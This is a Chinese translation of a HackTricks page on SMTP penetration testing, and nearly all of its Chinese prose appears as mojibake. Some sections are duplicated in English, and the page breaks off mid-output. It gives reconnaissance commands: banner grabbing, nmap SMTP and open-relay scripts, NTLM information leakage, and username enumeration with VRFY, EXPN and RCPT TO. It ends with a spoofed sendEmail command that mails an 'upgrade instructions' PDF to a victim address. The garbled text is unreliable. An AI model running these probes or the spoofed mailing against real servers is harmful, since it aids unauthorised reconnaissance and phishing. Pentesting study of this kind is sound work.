# 25,465,587 - SMTP/s æ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference æ˜¯ä¸€åœºå›½é™…ç½‘ç»œå®‰å…¨æ´»åŠ¨**](https://www.dragonjarcon.org/)ï¼Œå·²ç»ä¸¾åŠäº†åå¤šå¹´ï¼Œå°†äº2023å¹´9æœˆ7æ—¥è‡³8æ—¥åœ¨å“¥ä¼¦æ¯”äºšæ³¢å“¥å¤§ä¸¾è¡Œã€‚è¿™æ˜¯ä¸€ä¸ªå†…å®¹ä¸°å¯Œçš„æŠ€æœ¯æ´»åŠ¨ï¼Œå±•ç¤ºäº†å¸å¼•å…¨çƒé»‘å®¢å’Œç ”ç©¶äººå‘˜çš„æœ€æ–°è¥¿ç­ç‰™è¯­ç ”ç©¶æˆæœã€‚\
ç«‹å³åœ¨ä»¥ä¸‹é“¾æ¥æ³¨å†Œï¼Œä¸è¦é”™è¿‡è¿™ä¸ªé‡è¦çš„ä¼šè®®ï¼:

{% embed url="https://www.dragonjarcon.org/" %}

## **åŸºæœ¬ä¿¡æ¯**

**SMTPï¼ˆç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼‰**æ˜¯ä¸€ç§ç”¨äº**å‘é€**å’Œ**æ¥æ”¶ç”µå­é‚®ä»¶**çš„TCP/IPåè®®ã€‚ç„¶è€Œï¼Œç”±äºå®ƒåœ¨æ¥æ”¶ç«¯çš„æ¶ˆæ¯æ’é˜Ÿèƒ½åŠ›æœ‰é™ï¼Œé€šå¸¸ä¸å¦å¤–ä¸¤ä¸ªåè®®ä¹‹ä¸€ä¸€èµ·ä½¿ç”¨ï¼Œå³POP3æˆ–IMAPï¼Œè¿™ä¸¤ä¸ªåè®®å…è®¸ç”¨æˆ·å°†æ¶ˆæ¯ä¿å­˜åœ¨æœåŠ¡å™¨é‚®ç®±ä¸­ï¼Œå¹¶å®šæœŸä»æœåŠ¡å™¨ä¸‹è½½ã€‚

æ¢å¥è¯è¯´ï¼Œ**ç”¨æˆ·é€šå¸¸ä½¿ç”¨**ä¸€ä¸ªä½¿ç”¨**SMTPå‘é€ç”µå­é‚®ä»¶**å’Œ**POP3æˆ–IMAPæ¥æ”¶ç”µå­é‚®ä»¶**çš„ç¨‹åºã€‚åœ¨åŸºäºUnixçš„ç³»ç»Ÿä¸­ï¼Œsendmailæ˜¯æœ€å¹¿æ³›ä½¿ç”¨çš„ç”¨äºç”µå­é‚®ä»¶çš„SMTPæœåŠ¡å™¨ã€‚å•†ä¸šè½¯ä»¶SendmailåŒ…æ‹¬ä¸€ä¸ªPOP3æœåŠ¡å™¨ã€‚**Microsoft Exchange**åŒ…æ‹¬ä¸€ä¸ªSMTPæœåŠ¡å™¨ï¼Œå¹¶ä¸”è¿˜å¯ä»¥è®¾ç½®ä¸ºåŒ…æ‹¬POP3æ”¯æŒã€‚\
æ¥æºï¼š[è¿™é‡Œ](https://whatis.techtarget.com/definition/SMTP-Simple-Mail-Transfer-Protocol)ã€‚

**é»˜è®¤ç«¯å£ï¼š**25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### é‚®ä»¶å¤´

å¦‚æœä½ æœ‰æœºä¼šè®©å—å®³è€…ç»™ä½ å‘é€ä¸€å°é‚®ä»¶ï¼ˆä¾‹å¦‚é€šè¿‡ç½‘é¡µçš„è”ç³»è¡¨å•ï¼‰ï¼Œè¯·è¿™æ ·åšï¼Œå› ä¸ºé€šè¿‡æŸ¥çœ‹é‚®ä»¶çš„å¤´éƒ¨ï¼Œä½ å¯ä»¥äº†è§£å—å®³è€…çš„å†…éƒ¨æ‹“æ‰‘ç»“æ„ã€‚

ä½ è¿˜å¯ä»¥é€šè¿‡å‘SMTPæœåŠ¡å™¨å‘é€ä¸€å°é‚®ä»¶åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„åœ°å€ï¼ˆå› ä¸ºæœåŠ¡å™¨ä¼šå‘æ”»å‡»è€…å‘é€ä¸€å°NDNé‚®ä»¶ï¼‰æ¥è·å–é‚®ä»¶ã€‚ä½†æ˜¯ï¼Œè¯·ç¡®ä¿ä½ ä»ä¸€ä¸ªå…è®¸çš„åœ°å€å‘é€é‚®ä»¶ï¼ˆæ£€æŸ¥SPFç­–ç•¥ï¼‰ï¼Œå¹¶ä¸”ä½ èƒ½å¤Ÿæ¥æ”¶NDNæ¶ˆæ¯ã€‚

ä½ è¿˜åº”è¯¥å°è¯•å‘é€ä¸åŒçš„å†…å®¹ï¼Œå› ä¸ºä½ å¯ä»¥åœ¨é‚®ä»¶å¤´ä¸­æ‰¾åˆ°æ›´æœ‰è¶£çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼š`X-Virus-Scanned: by av.domain.com`\
ä½ åº”è¯¥å‘é€EICARæµ‹è¯•æ–‡ä»¶ã€‚\
æ£€æµ‹åˆ°**AV**å¯èƒ½ä¼šè®©ä½ åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚

## åŸºæœ¬æ“ä½œ

### **Banner Grabbing/åŸºæœ¬è¿æ¥**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**ï¼ˆSecure SMTPï¼‰æ˜¯ä¸€ç§é€šè¿‡TLS/SSLåŠ å¯†çš„SMTPåè®®ã€‚å®ƒæä¾›äº†ä¸€ç§å®‰å…¨çš„æ–¹å¼æ¥ä¼ è¾“ç”µå­é‚®ä»¶ã€‚SMTPSä½¿ç”¨465ç«¯å£è¿›è¡Œé€šä¿¡ï¼Œå¹¶ä¸”åœ¨å»ºç«‹è¿æ¥åç«‹å³å¯ç”¨åŠ å¯†ã€‚è¿™ç§åŠ å¯†ä¿æŠ¤äº†é‚®ä»¶çš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»å’Œçªƒå¬ã€‚åœ¨è¿›è¡ŒSMTPSæ¸—é€æµ‹è¯•æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å„ç§æŠ€æœ¯å’Œå·¥å…·æ¥æ£€æµ‹å’Œåˆ©ç”¨å¯èƒ½å­˜åœ¨çš„æ¼æ´ã€‚
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### æŸ¥æ‰¾ç»„ç»‡çš„MXæœåŠ¡å™¨

To find the MX servers of an organization, you can use the following methods:

è¦æŸ¥æ‰¾ç»„ç»‡çš„MXæœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š

#### Method 1: DNS Lookup

#### æ–¹æ³•1ï¼šDNSæŸ¥æ‰¾

Perform a DNS lookup for the organization's domain name using the `nslookup` or `dig` command. Look for the MX records in the DNS response. These records specify the mail servers responsible for receiving emails for the domain.

ä½¿ç”¨`nslookup`æˆ–`dig`å‘½ä»¤å¯¹ç»„ç»‡çš„åŸŸåè¿›è¡ŒDNSæŸ¥æ‰¾ã€‚åœ¨DNSå“åº”ä¸­æŸ¥æ‰¾MXè®°å½•ã€‚è¿™äº›è®°å½•æŒ‡å®šè´Ÿè´£æ¥æ”¶è¯¥åŸŸçš„ç”µå­é‚®ä»¶çš„é‚®ä»¶æœåŠ¡å™¨ã€‚

Example command using `nslookup`:

ä½¿ç”¨`nslookup`çš„ç¤ºä¾‹å‘½ä»¤ï¼š

```
nslookup -type=MX example.com
```

#### Method 2: Online Tools

#### æ–¹æ³•2ï¼šåœ¨çº¿å·¥å…·

There are various online tools available that can help you find the MX servers of an organization. These tools perform DNS lookups and provide the MX records for a given domain.

æœ‰è®¸å¤šåœ¨çº¿å·¥å…·å¯ç”¨äºå¸®åŠ©æ‚¨æŸ¥æ‰¾ç»„ç»‡çš„MXæœåŠ¡å™¨ã€‚è¿™äº›å·¥å…·æ‰§è¡ŒDNSæŸ¥æ‰¾å¹¶æä¾›ç»™å®šåŸŸçš„MXè®°å½•ã€‚

Some popular online tools for finding MX servers include:

ä¸€äº›å¸¸ç”¨çš„ç”¨äºæŸ¥æ‰¾MXæœåŠ¡å™¨çš„åœ¨çº¿å·¥å…·åŒ…æ‹¬ï¼š

- [MX Toolbox](https://mxtoolbox.com/)
- [DNSstuff](https://www.dnsstuff.com/)
- [Network-Tools](https://network-tools.com/)

Using these tools, enter the organization's domain name and look for the MX records in the results.

ä½¿ç”¨è¿™äº›å·¥å…·ï¼Œè¾“å…¥ç»„ç»‡çš„åŸŸåå¹¶åœ¨ç»“æœä¸­æŸ¥æ‰¾MXè®°å½•ã€‚
```bash
dig +short mx google.com
```
### æšä¸¾

SMTPæšä¸¾æ˜¯ä¸€ç§ç”¨äºæ”¶é›†æœ‰å…³ç›®æ ‡SMTPæœåŠ¡å™¨çš„ä¿¡æ¯çš„è¿‡ç¨‹ã€‚é€šè¿‡æšä¸¾SMTPæœåŠ¡å™¨ï¼Œé»‘å®¢å¯ä»¥è·å–æœ‰å…³ç›®æ ‡ç½‘ç»œçš„é‡è¦ä¿¡æ¯ï¼Œä¾‹å¦‚æœ‰æ•ˆçš„ç”¨æˆ·åˆ—è¡¨ã€é‚®ä»¶åˆ«åã€æ”¯æŒçš„èº«ä»½éªŒè¯æ–¹æ³•å’ŒæœåŠ¡å™¨é…ç½®ã€‚

#### 1. åŸºæœ¬æšä¸¾

åŸºæœ¬æšä¸¾æ˜¯é€šè¿‡ä¸SMTPæœåŠ¡å™¨å»ºç«‹è¿æ¥å¹¶å‘é€å‘½ä»¤æ¥è·å–æœ‰å…³æœåŠ¡å™¨çš„åŸºæœ¬ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„åŸºæœ¬æšä¸¾å‘½ä»¤ï¼š

- `HELO`ï¼šå‘æœåŠ¡å™¨å‘é€HELOå‘½ä»¤ä»¥å»ºç«‹ä¸æœåŠ¡å™¨çš„è¿æ¥ã€‚
- `EHLO`ï¼šå‘æœåŠ¡å™¨å‘é€EHLOå‘½ä»¤ä»¥è·å–æœåŠ¡å™¨çš„è¯¦ç»†ä¿¡æ¯ã€‚
- `VRFY`ï¼šå‘æœåŠ¡å™¨å‘é€VRFYå‘½ä»¤ä»¥éªŒè¯ç”¨æˆ·æˆ–é‚®ä»¶åˆ«åçš„å­˜åœ¨ã€‚
- `EXPN`ï¼šå‘æœåŠ¡å™¨å‘é€EXPNå‘½ä»¤ä»¥å±•å¼€é‚®ä»¶åˆ«åã€‚
- `HELP`ï¼šå‘æœåŠ¡å™¨å‘é€HELPå‘½ä»¤ä»¥è·å–å¸®åŠ©ä¿¡æ¯ã€‚

#### 2. ç”¨æˆ·æšä¸¾

ç”¨æˆ·æšä¸¾æ˜¯é€šè¿‡å°è¯•ä¸åŒçš„ç”¨æˆ·åæ¥ç¡®å®šæœ‰æ•ˆç”¨æˆ·çš„è¿‡ç¨‹ã€‚é»‘å®¢å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œç”¨æˆ·æšä¸¾ï¼š

- å­—å…¸æ”»å‡»ï¼šä½¿ç”¨å¸¸è§ç”¨æˆ·ååˆ—è¡¨æˆ–è‡ªå®šä¹‰å­—å…¸å°è¯•ç™»å½•ã€‚
- ç”¨æˆ·åçŒœæµ‹ï¼šæ ¹æ®ç›®æ ‡ç»„ç»‡çš„å‘½åçº¦å®šçŒœæµ‹æœ‰æ•ˆçš„ç”¨æˆ·åã€‚
- ç”¨æˆ·åæšä¸¾å·¥å…·ï¼šä½¿ç”¨ä¸“é—¨çš„å·¥å…·ï¼Œå¦‚SMTP User Enumï¼Œæ¥è‡ªåŠ¨åŒ–ç”¨æˆ·æšä¸¾è¿‡ç¨‹ã€‚

#### 3. é‚®ä»¶åˆ«åæšä¸¾

é‚®ä»¶åˆ«åæšä¸¾æ˜¯é€šè¿‡å°è¯•ä¸åŒçš„é‚®ä»¶åˆ«åæ¥ç¡®å®šæœ‰æ•ˆåˆ«åçš„è¿‡ç¨‹ã€‚é»‘å®¢å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œé‚®ä»¶åˆ«åæšä¸¾ï¼š

- å­—å…¸æ”»å‡»ï¼šä½¿ç”¨å¸¸è§é‚®ä»¶åˆ«ååˆ—è¡¨æˆ–è‡ªå®šä¹‰å­—å…¸å°è¯•å±•å¼€åˆ«åã€‚
- åˆ«åçŒœæµ‹ï¼šæ ¹æ®ç›®æ ‡ç»„ç»‡çš„å‘½åçº¦å®šçŒœæµ‹æœ‰æ•ˆçš„é‚®ä»¶åˆ«åã€‚
- åˆ«åæšä¸¾å·¥å…·ï¼šä½¿ç”¨ä¸“é—¨çš„å·¥å…·ï¼Œå¦‚SMTP User Enumï¼Œæ¥è‡ªåŠ¨åŒ–é‚®ä»¶åˆ«åæšä¸¾è¿‡ç¨‹ã€‚

#### 4. èº«ä»½éªŒè¯æšä¸¾

èº«ä»½éªŒè¯æšä¸¾æ˜¯é€šè¿‡å°è¯•ä¸åŒçš„èº«ä»½éªŒè¯æ–¹æ³•æ¥ç¡®å®šæœåŠ¡å™¨æ”¯æŒçš„èº«ä»½éªŒè¯ç±»å‹çš„è¿‡ç¨‹ã€‚é»‘å®¢å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œèº«ä»½éªŒè¯æšä¸¾ï¼š

- å°è¯•å¸¸è§çš„èº«ä»½éªŒè¯æ–¹æ³•ï¼Œå¦‚PLAINã€LOGINã€CRAM-MD5ç­‰ã€‚
- ä½¿ç”¨SMTPæ‰«æå·¥å…·ï¼Œå¦‚Nmapçš„SMTPæ‰«æè„šæœ¬ï¼Œæ¥è‡ªåŠ¨åŒ–èº«ä»½éªŒè¯æšä¸¾è¿‡ç¨‹ã€‚

#### 5. é‚®ä»¶æœåŠ¡å™¨é…ç½®æšä¸¾

é‚®ä»¶æœåŠ¡å™¨é…ç½®æšä¸¾æ˜¯é€šè¿‡è·å–æœ‰å…³ç›®æ ‡æœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯æ¥ç¡®å®šæœåŠ¡å™¨çš„å¼±ç‚¹å’Œæ½œåœ¨æ¼æ´çš„è¿‡ç¨‹ã€‚é»‘å®¢å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œé‚®ä»¶æœåŠ¡å™¨é…ç½®æšä¸¾ï¼š

- æŸ¥æ‰¾å…¬å¼€å¯ç”¨çš„SMTPæœåŠ¡å™¨é…ç½®æ–‡ä»¶ã€‚
- ä½¿ç”¨SMTPæ‰«æå·¥å…·ï¼Œå¦‚Nmapçš„SMTPæ‰«æè„šæœ¬ï¼Œæ¥è·å–æœåŠ¡å™¨é…ç½®ä¿¡æ¯ã€‚

æšä¸¾SMTPæœåŠ¡å™¨æ˜¯é»‘å®¢åœ¨è¿›è¡ŒSMTPæ¸—é€æµ‹è¯•æ—¶çš„é‡è¦æ­¥éª¤ã€‚é€šè¿‡æœ‰æ•ˆçš„æšä¸¾ï¼Œé»‘å®¢å¯ä»¥æ”¶é›†æœ‰å…³ç›®æ ‡ç½‘ç»œçš„å…³é”®ä¿¡æ¯ï¼Œä»è€Œæ›´å¥½åœ°è§„åˆ’å’Œæ‰§è¡Œåç»­çš„æ”»å‡»ã€‚
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLMèº«ä»½éªŒè¯ - ä¿¡æ¯æ³„éœ²

å¦‚æœæœåŠ¡å™¨æ”¯æŒNTLMèº«ä»½éªŒè¯ï¼ˆWindowsï¼‰ï¼Œæ‚¨å¯ä»¥è·å–æ•æ„Ÿä¿¡æ¯ï¼ˆç‰ˆæœ¬ï¼‰ã€‚æ›´å¤šä¿¡æ¯[**åœ¨è¿™é‡Œ**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)ã€‚
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
æˆ–è€…ä½¿ç”¨nmapæ’ä»¶`smtp-ntlm-info.nse`æ¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ã€‚

### å†…éƒ¨æœåŠ¡å™¨åç§° - ä¿¡æ¯æ³„éœ²

å½“å‘å‡ºä¸å¸¦å®Œæ•´åœ°å€çš„"MAIL FROM"å‘½ä»¤æ—¶ï¼Œä¸€äº›SMTPæœåŠ¡å™¨ä¼šè‡ªåŠ¨è¡¥å…¨å‘ä»¶äººåœ°å€ï¼Œä»è€Œæ³„éœ²å…¶å†…éƒ¨åç§°ï¼š
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### å—…æ¢

æ£€æŸ¥æ˜¯å¦ä»ç«¯å£25çš„æ•°æ®åŒ…ä¸­å—…æ¢åˆ°äº†ä¸€äº›å¯†ç 

### [è®¤è¯æš´åŠ›ç ´è§£](../../generic-methodologies-and-resources/brute-force.md#smtp)

## ç”¨æˆ·åæš´åŠ›ç ´è§£æšä¸¾

**å¹¶éæ€»æ˜¯éœ€è¦è®¤è¯**

### RCPT TO
```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY

VRFY æ˜¯ä¸€ç§ SMTP å‘½ä»¤ï¼Œç”¨äºéªŒè¯ç”µå­é‚®ä»¶åœ°å€çš„æœ‰æ•ˆæ€§ã€‚å®ƒå…è®¸æ”»å‡»è€…é€šè¿‡å‘é€ VRFY å‘½ä»¤æ¥æ£€æŸ¥ç‰¹å®šç”¨æˆ·æˆ–é‚®ä»¶åˆ—è¡¨æ˜¯å¦å­˜åœ¨äºç›®æ ‡é‚®ä»¶æœåŠ¡å™¨ä¸Šã€‚è¿™å¯ä»¥å¸®åŠ©æ”»å‡»è€…ç¡®å®šæœ‰æ•ˆçš„ç”¨æˆ·è´¦æˆ·ï¼Œä»è€Œè¿›è¡Œæ›´æœ‰é’ˆå¯¹æ€§çš„æ”»å‡»ã€‚

ç„¶è€Œï¼Œå¤§å¤šæ•°ç°ä»£é‚®ä»¶æœåŠ¡å™¨å·²ç»ç¦ç”¨äº† VRFY å‘½ä»¤ï¼Œå› ä¸ºå®ƒå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œç”¨æˆ·éšç§é—®é¢˜ã€‚å› æ­¤ï¼Œåœ¨è¿›è¡Œ SMTP æ¸—é€æµ‹è¯•æ—¶ï¼ŒVRFY å‘½ä»¤é€šå¸¸ä¸å¯ç”¨ã€‚

å¦‚æœä½ å°è¯•ä½¿ç”¨ VRFY å‘½ä»¤ï¼Œå¹¶ä¸”æœåŠ¡å™¨è¿”å› "502 Command not implemented" æˆ–ç±»ä¼¼çš„é”™è¯¯æ¶ˆæ¯ï¼Œé‚£ä¹ˆè¯´æ˜ç›®æ ‡æœåŠ¡å™¨å·²ç¦ç”¨ VRFY å‘½ä»¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ éœ€è¦å°è¯•å…¶ä»–çš„ SMTP æ¸—é€æµ‹è¯•æŠ€æœ¯æ¥è·å–ç›®æ ‡ç”¨æˆ·çš„ä¿¡æ¯ã€‚
```
$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
250 Super-User <root@myhost>
VRFY blah
550 blah... User unknown
```
### EXPN

The EXPN command is used to expand a mailing list on an SMTP server. It can be used to obtain information about the members of a mailing list, including their email addresses. This command can be useful for reconnaissance purposes during a penetration test.

To use the EXPN command, you can simply send the following command to the SMTP server:

```
EXPN <mailing_list>
```

Replace `<mailing_list>` with the name of the mailing list you want to expand. If the server supports the EXPN command and the mailing list exists, it will respond with the expanded list of email addresses.

It's important to note that not all SMTP servers support the EXPN command, as it can be a security risk. Some servers may disable this command to prevent unauthorized access to mailing list information.

During a penetration test, the EXPN command can be used to gather information about potential targets or to verify the existence of specific email addresses. However, it's crucial to obtain proper authorization before performing any penetration testing activities.
```
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 <ed.williams@myhost>
EXPN sshd
250 2.1.5 sshd privsep <sshd@mail2>
```
è‡ªåŠ¨åŒ–å·¥å…·

There are several automatic tools available that can be used to enumerate usernames on SMTP servers. These tools automate the process of sending multiple requests to the server and analyzing the responses to determine if a username is valid or not. Some popular tools include:

æœ‰å‡ ç§å¯ç”¨çš„è‡ªåŠ¨åŒ–å·¥å…·å¯ä»¥ç”¨æ¥æšä¸¾SMTPæœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·åã€‚è¿™äº›å·¥å…·è‡ªåŠ¨åŒ–äº†å‘æœåŠ¡å™¨å‘é€å¤šä¸ªè¯·æ±‚å¹¶åˆ†æå“åº”ä»¥ç¡®å®šç”¨æˆ·åæ˜¯å¦æœ‰æ•ˆçš„è¿‡ç¨‹ã€‚ä¸€äº›æµè¡Œçš„å·¥å…·åŒ…æ‹¬ï¼š

- **SMTP User Enum** - This tool is part of the Metasploit Framework and can be used to enumerate usernames on SMTP servers. It sends a series of VRFY and EXPN commands to the server and analyzes the responses to determine if a username is valid or not.

- **SMTP User Enum** - è¿™ä¸ªå·¥å…·æ˜¯Metasploitæ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥ç”¨æ¥æšä¸¾SMTPæœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·åã€‚å®ƒå‘æœåŠ¡å™¨å‘é€ä¸€ç³»åˆ—çš„VRFYå’ŒEXPNå‘½ä»¤ï¼Œå¹¶åˆ†æå“åº”ä»¥ç¡®å®šç”¨æˆ·åæ˜¯å¦æœ‰æ•ˆã€‚

- **Nmap** - Nmap is a popular network scanning tool that can also be used to enumerate usernames on SMTP servers. The Nmap script "smtp-enum-users" can be used to send VRFY and EXPN commands to the server and analyze the responses.

- **Nmap** - Nmapæ˜¯ä¸€ä¸ªæµè¡Œçš„ç½‘ç»œæ‰«æå·¥å…·ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æšä¸¾SMTPæœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·åã€‚Nmapè„šæœ¬â€œsmtp-enum-usersâ€å¯ä»¥ç”¨æ¥å‘æœåŠ¡å™¨å‘é€VRFYå’ŒEXPNå‘½ä»¤ï¼Œå¹¶åˆ†æå“åº”ã€‚

- **SMTP User Enumeration** - This is a standalone tool that can be used to enumerate usernames on SMTP servers. It sends a series of commands to the server and analyzes the responses to determine if a username is valid or not.

- **SMTP User Enumeration** - è¿™æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥æšä¸¾SMTPæœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·åã€‚å®ƒå‘æœåŠ¡å™¨å‘é€ä¸€ç³»åˆ—çš„å‘½ä»¤ï¼Œå¹¶åˆ†æå“åº”ä»¥ç¡®å®šç”¨æˆ·åæ˜¯å¦æœ‰æ•ˆã€‚

These tools can be useful for quickly enumerating usernames on SMTP servers, but it's important to note that they can also be detected by intrusion detection systems (IDS) and may trigger alerts. It's recommended to use these tools responsibly and with proper authorization.
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conferenceæ˜¯ä¸€åœºå›½é™…ç½‘ç»œå®‰å…¨æ´»åŠ¨**](https://www.dragonjarcon.org/)ï¼Œå·²ç»ä¸¾åŠäº†åå¤šå¹´ï¼Œå°†äº2023å¹´9æœˆ7æ—¥è‡³8æ—¥åœ¨å“¥ä¼¦æ¯”äºšæ³¢å“¥å¤§ä¸¾è¡Œã€‚è¿™æ˜¯ä¸€ä¸ªå†…å®¹ä¸°å¯Œçš„æŠ€æœ¯æ´»åŠ¨ï¼Œå±•ç¤ºäº†æœ€æ–°çš„è¥¿ç­ç‰™è¯­ç ”ç©¶æˆæœï¼Œå¸å¼•äº†æ¥è‡ªä¸–ç•Œå„åœ°çš„é»‘å®¢å’Œç ”ç©¶äººå‘˜ã€‚\
ç«‹å³åœ¨ä»¥ä¸‹é“¾æ¥æ³¨å†Œï¼Œä¸è¦é”™è¿‡è¿™ä¸ªé‡è¦çš„ä¼šè®®ï¼ï¼š

{% embed url="https://www.dragonjarcon.org/" %}

## DSNæŠ¥å‘Š

**ä¼ é€’çŠ¶æ€é€šçŸ¥æŠ¥å‘Š**ï¼šå¦‚æœæ‚¨å‘ä¸€ä¸ªç»„ç»‡å‘é€ä¸€å°**ç”µå­é‚®ä»¶**åˆ°ä¸€ä¸ª**æ— æ•ˆçš„åœ°å€**ï¼Œè¯¥ç»„ç»‡å°†é€šè¿‡å‘æ‚¨å‘é€ä¸€å°**é‚®ä»¶**æ¥é€šçŸ¥è¯¥åœ°å€æ— æ•ˆã€‚è¿”å›çš„ç”µå­é‚®ä»¶çš„**æ ‡å¤´**å°†**åŒ…å«**å¯èƒ½çš„**æ•æ„Ÿä¿¡æ¯**ï¼ˆå¦‚ä¸æŠ¥å‘Šäº¤äº’çš„é‚®ä»¶æœåŠ¡çš„IPåœ°å€æˆ–é˜²ç—…æ¯’è½¯ä»¶ä¿¡æ¯ï¼‰ã€‚

## [å‘½ä»¤](smtp-commands.md)

### ä»Linuxæ§åˆ¶å°å‘é€ç”µå­é‚®ä»¶
```
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
